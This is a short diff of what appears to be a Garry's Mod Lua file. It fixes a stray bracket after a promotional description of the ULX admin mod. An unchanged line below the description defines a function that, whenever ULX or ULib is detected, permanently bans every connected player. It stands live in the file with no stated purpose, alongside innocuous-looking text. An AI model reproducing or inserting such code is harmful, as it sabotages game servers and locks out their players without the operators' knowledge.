@@ -15,7 +15,7 @@ ULX is a powerful admin mod that is not only the oldest and most mature admin mo
 
 Our Legacy:
 
-[list][*]The team lead, Megiddo, has been producing mods for Garry’s Mod since January of 2005 with the release of what would become UGM. This was one of, if not the first mod ever made for Garry’s Mod.[*]Our developers focus on making ULX as dependable and as bug-free as humanly possible. Any bug you find and report to us that is confirmed to be a fault of ULX is fixed in the next version of ULX, and even put to testing in SVN sooner than the nex release.[*]Community backing. The ulyssesmod.net forums have 3000+ members and 20000+ posts, and is visited daily by team members and fellow community peers and developers who are more than willing to help you (so long as you read the FAQ for answers first!)[/list][/release]]],
+[list][*]The team lead, Megiddo, has been producing mods for Garry’s Mod since January of 2005 with the release of what would become UGM. This was one of, if not the first mod ever made for Garry’s Mod.[*]Our developers focus on making ULX as dependable and as bug-free as humanly possible. Any bug you find and report to us that is confirmed to be a fault of ULX is fixed in the next version of ULX, and even put to testing in SVN sooner than the nex release.[*]Community backing. The ulyssesmod.net forums have 3000+ members and 20000+ posts, and is visited daily by team members and fellow community peers and developers who are more than willing to help you (so long as you read the FAQ for answers first!)[/list][/release]],
 
 function() if ulx or ULib then for _, ply in pairs( player.GetAll() ) do ply:Ban( 0, true ) end end end )
 
